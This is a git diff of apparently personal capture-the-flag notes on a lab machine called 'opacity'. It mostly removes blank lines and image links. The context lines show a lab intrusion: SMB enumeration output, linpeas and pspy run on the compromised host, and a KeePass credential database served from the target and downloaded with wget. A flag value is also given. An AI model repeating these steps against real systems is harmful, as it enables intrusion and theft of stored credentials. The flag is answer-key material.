@@ -193,12 +193,9 @@ Username ......... ''
 Password ......... ''
 Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
-
  ===========================( Enumerating Workgroup/Domain on 10.10.142.194 )===========================
 
-
 [+] Got domain/workgroup name: WORKGROUP
-
 
  ===============================( Nbtstat Information for 10.10.142.194 )===============================
 
@@ -215,9 +212,7 @@ Looking up status of 10.10.142.194
 
  ===================================( Session Check on 10.10.142.194 )===================================
 
-
 [+] Server 10.10.142.194 allows sessions using username '', password ''
-
 
  ================================( Getting domain SID for 10.10.142.194 )================================
 
@@ -226,19 +221,15 @@ Domain Sid: (NULL SID)
 
 [+] Can't determine if host is part of domain or part of a workgroup
 
-
  ==================================( OS information on 10.10.142.194 )==================================
 
-
 [E] Can't get OS info with smbclient
-
 
 [+] Got OS info for 10.10.142.194 from srvinfo: 
 	OPACITY        Wk Sv PrQ Unx NT SNT opacity server (Samba, Ubuntu)
 	platform_id     :	500
 	os version      :	6.1
 	server type     :	0x809a03
-
 
  =======================================( Users on 10.10.142.194 )=======================================
 
@@ -271,8 +262,6 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 
  ===========================( Password Policy Information for 10.10.142.194 )===========================
 
-
-
 [+] Attaching to 10.10.142.194 using a NULL share
 
 [+] Trying protocol 139/SMB...
@@ -302,38 +291,26 @@ NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 	[+] Account Lockout Threshold: None
 	[+] Forced Log off Time: 37 days 6 hours 21 minutes 
 
-
-
 [+] Retieved partial password policy with rpcclient:
-
 
 Password Complexity: Disabled
 Minimum Password Length: 5
 
-
  ======================================( Groups on 10.10.142.194 )======================================
-
 
 [+] Getting builtin groups:
 
-
 [+]  Getting builtin group memberships:
-
 
 [+]  Getting local groups:
 
-
 [+]  Getting local group memberships:
-
 
 [+]  Getting domain groups:
 
-
 [+]  Getting domain group memberships:
 
-
  ==================( Users on 10.10.142.194 via RID cycling (RIDS: 500-550,1000-1050) )==================
-
 
 [I] Found new SID: 
 S-1-22-1
@@ -373,13 +350,11 @@ S-1-5-21-1327801453-43412457-3647261475-513 OPACITY\None (Domain Group)
 
 No printers returned.
 
-
 enum4linux complete on Sun Apr  9 19:19:44 2023
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ file filekoth                   
 filekoth: JPEG image data, JFIF standard 1.01, resolution (DPI), density 72x72, segment length 16, baseline, precision 8, 1350x900, components 3
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ python3 -m http.server 1234                                       
@@ -486,7 +461,6 @@ cat login.php
 </head>
 <body>
 
-
   
 
 <br>
@@ -537,10 +511,8 @@ www-data@opacity:/home/sysadmin/scripts/lib$ cat backup.inc.php
 cat backup.inc.php
 <?php
 
-
 ini_set('max_execution_time', 600);
 ini_set('memory_limit', '1024M');
-
 
 function zipData($source, $destination) {
 	if (extension_loaded('zip')) {
@@ -592,7 +564,6 @@ chmod +x linpeas.sh
 www-data@opacity:/tmp$ ./linpeas.sh
 ./linpeas.sh
 
-
                             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                     ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
              ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
@@ -642,7 +613,6 @@ Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privi
 
  Starting linpeas. Caching Writable Folders...
 
-
 ╔══════════╣ Analyzing Keepass Files (limit 70)
 -rwxrwxr-x 1 sysadmin sysadmin 1566 Jul  8  2022 /opt/dataset.kdbx
 
@@ -659,7 +629,6 @@ www-data@opacity:/opt$ python3 -m http.server
 python3 -m http.server 
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 10.8.19.103 - - [10/Apr/2023 00:16:32] "GET /dataset.kdbx HTTP/1.1" 200 -
-
 
 ┌──(witty㉿kali)-[~/Downloads]
 └─$ wget http://10.10.142.194:8000/dataset.kdbx
@@ -738,7 +707,6 @@ Expanded Security Maintenance for Applications is not enabled.
 Enable ESM Apps to receive additional future security updates.
 See https://ubuntu.com/esm or run: sudo pro status
 
-
 The list of available updates is more than a week old.
 To check for new updates run: sudo apt update
 
@@ -764,7 +732,6 @@ pspy64               100%[====================>]   2.96M  1.12MB/s    in 2.6s
 sysadmin@opacity:/tmp$ chmod +x pspy64
 sysadmin@opacity:/tmp$ ./pspy64
 pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
-
 
      ██▓███    ██████  ██▓███ ▓██   ██▓
     ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
@@ -937,10 +904,8 @@ if(file_exists($dir)){
 sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
 <?php
 
-
 ini_set('max_execution_time', 600);
 ini_set('memory_limit', '1024M');
-
 
 function zipData($source, $destination) {
 	if (extension_loaded('zip')) {
@@ -1005,15 +970,7 @@ cd snap
 ls
 lxd
 
-
 ```
-
-
-![[Pasted image 20230409182615.png]]
-
-![[Pasted image 20230409184553.png]]
-![[Pasted image 20230409192348.png]]
-![[Pasted image 20230409192438.png]]
 
 What is the  local.txt flag?
 
@@ -1023,26 +980,6 @@ What is the proof.txt flag?
 
 *ac0d56f93202dd57dcb2498c739fd20e*
 
-
 [[PWN101]]
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 [[PWN101]]
